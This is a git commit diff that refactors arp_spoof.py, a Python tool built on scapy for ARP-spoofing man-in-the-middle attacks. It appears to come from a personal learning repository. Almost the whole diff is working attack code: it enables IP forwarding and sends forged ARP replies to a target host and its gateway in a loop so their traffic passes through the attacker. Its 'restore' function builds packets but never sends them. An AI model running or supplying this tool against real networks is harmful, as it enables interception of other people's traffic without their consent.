5bf122beb2020ce50bfe66e294a02e44b4c98ae1
RobertByrnes <robbyrnes@hotmail.co.uk>
2021-02-18 23:22:33 +0000

    refactoring arp_spoof.py

--- MITM/arp_spoof.py
+++ MITM/arp_spoof.py
@@ -1,13 +1,9 @@
 #! usr/bin/python
-
-import time
-from twisted.conch.test.test_recvline import end
-
-import scapy.all as scapy
 import argparse
 import os
+import time
 
-os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+import scapy.all as scapy
 
 
 def capture_ips():
@@ -20,47 +16,51 @@ def capture_ips():
     return victims
 
 
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast_mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast_mac / arp_request
-    try:
-        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-        return answered_list[0][1].hwsrc
-    except Exception as e:
-        print("\n\n [-] Error getting mac address ... retrying.\n\n")
-        get_mac(ip)
+class ArpSpoof:
+    def __init__(self):
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+        self.targets = capture_ips()
+        if self.targets:
+            self.target_mac = ""
+            self.middle_man(self.targets.target_ip, self.targets.gateway_ip)
+
+    def get_mac(self, ip):
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast_mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast_mac / arp_request
+        try:
+            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+            return answered_list[0][1].hwsrc
+        except Exception as e:
+            print("\n\n [-] Error getting mac address ... retrying.\n\n")
+            print(e)
+            self.get_mac(ip)
+
+    def arp_spoof(self, target_ip, spoof_ip):
+        if self.target_mac == "":
+            self.target_mac = self.get_mac(target_ip)
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.target_mac, psrc=spoof_ip)
+        scapy.send(packet, verbose=False)
+
+    def restore(self, destination_ip, source_ip):
+        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=self.get_mac(destination_ip),
+                           psrc=source_ip, hwsrc=self.get_mac(source_ip))
+
+    def middle_man(self, target_ip, gateway_ip):
+        try:
+            sent_packets_count = 0
+            while True:
+                # victim - router / router - victim
+                self.arp_spoof(target_ip, gateway_ip)
+                self.arp_spoof(gateway_ip, target_ip)
+                sent_packets_count = sent_packets_count + 2
+                print("\r[+] Packets sent: " + str(sent_packets_count))
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            print("[+] Detected CTRL+C ... Resetting ARP tables now ... please wait.")
+            self.restore(target_ip, gateway_ip)
+            self.restore(gateway_ip, target_ip)
 
 
-def arp_spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
 
 
-def restore(destination_ip, source_ip):
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
-                       psrc=source_ip, hwsrc=get_mac(source_ip))
-
-
-def middle_man(target_ip, gateway_ip):
-    try:
-        sent_packets_count = 0
-        while True:
-            # victim - router / router - victim
-            arp_spoof(target_ip, gateway_ip)
-            arp_spoof(gateway_ip, target_ip)
-            sent_packets_count = sent_packets_count + 2
-            print("\r[+] Packets sent: " + str(sent_packets_count))
-            time.sleep(0.5)
-    except KeyboardInterrupt:
-        print("[+] Detected CTRL+C ... Resetting ARP tables now ... please wait.")
-        restore(target_ip, gateway_ip)
-        restore(gateway_ip, target_ip)
-
-
-targets = capture_ips()
-target_ip = targets.target_ip
-gateway_ip = targets.gateway_ip
-
-middle_man(target_ip, gateway_ip)
